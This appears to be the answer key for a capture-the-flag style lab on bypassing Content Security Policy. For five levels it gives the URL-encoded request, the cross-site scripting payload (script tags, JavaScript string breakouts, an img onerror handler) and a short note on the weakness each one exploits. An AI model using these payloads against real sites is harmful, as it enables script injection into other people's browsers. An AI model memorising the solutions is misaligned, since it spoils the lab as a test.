# csp-bypass — solutions

CSP-protected reflections with various policy weaknesses (unsafe-inline, nonce reuse, unsafe-eval, data: child, meta-tag).

### csp-bypass-level1

`/csp/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw HTML reflection, CSP allows 'unsafe-inline'

### csp-bypass-level2

`/csp/level2/?query=%27);alert(1);//`

- payload: `');alert(1);//`
- context: inside document.write('...') in a nonce'd script; break JS string

### csp-bypass-level3

`/csp/level3/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside eval('var userInput="..."') — break double-quoted JS string

### csp-bypass-level4

`/csp/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: reflected inside data: iframe src then posted to parent and innerHTML'd

### csp-bypass-level5

`/csp/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: meta CSP injected after reflection sink so it does not apply; unsafe-inline anyway
